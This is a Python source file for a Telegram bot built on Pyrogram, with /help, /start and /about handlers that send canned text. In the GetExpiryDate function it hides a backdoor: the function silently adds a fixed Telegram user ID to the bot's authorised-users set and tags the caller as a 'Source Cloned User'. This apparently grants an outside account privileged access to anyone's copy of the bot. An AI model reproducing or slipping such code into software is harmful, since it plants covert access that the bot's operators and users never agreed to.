#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="SUPPORT CHANNEL", url="t.me/Zed1Projctz")]]),
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
    
